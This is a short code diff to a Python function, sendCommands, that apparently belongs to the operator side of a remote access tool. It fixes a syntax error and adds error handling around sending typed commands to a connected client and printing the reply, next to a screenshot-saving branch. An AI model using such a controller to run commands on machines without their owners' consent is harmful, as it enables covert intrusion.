@@ -191,10 +191,14 @@ def sendCommands(conn):
             img.save(imgname)
             print(GREEN + BOLD + '[*] Screenshot output in ' + END + CYAN + imgname + END)
             print('                     ')
-        else len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            clientResponse = str(conn.recv(1024), "utf-8")
-            print('\n' + clientResponse, end="")
+        else:
+            try:
+                if len(str.encode(cmd)) > 0:
+                    conn.send(str.encode(cmd))
+                    clientResponse = str(conn.recv(1024), "utf-8")
+                    print('\n' + clientResponse, end="")
+            except:
+                print(RED + BOLD + '[!] There was an error in executing this command!')
 
 
 def main():
